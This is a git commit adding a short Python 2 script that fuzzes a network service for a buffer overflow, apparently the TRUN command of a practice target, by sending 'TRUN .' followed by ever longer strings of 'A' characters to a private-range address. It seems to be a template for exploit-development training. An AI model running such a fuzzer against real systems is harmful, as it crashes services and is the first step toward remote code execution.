5481fbc70f4f9aca222d3ae2a6bf78a62fc5dab3
Birb <7443606+TacoBirb@users.noreply.github.com>
2019-06-17 01:09:00 +0200

    Initial commit

---
+++ bof-template-1-spam.py
@@ -0,0 +1,24 @@
+#!/usr/bin/python2
+import time, struct, sys
+import socket as so
+
+server = '172.16.52.128'
+port = 5555
+
+auth = b'TRUN .'
+
+for i in range(50):
+  s = so.socket(so.AF_INET, so.SOCK_STREAM)
+
+  a_len = 300 * i
+  print "Attempting this many A's: ", a_len
+
+  the_req = auth + b'A' * a_len
+
+  # Execute the exploit
+  s.connect((server, port))
+  print repr(s.recv(1024))
+  s.send(the_req)
+  print repr(s.recv(1024))
+  s.close()
+
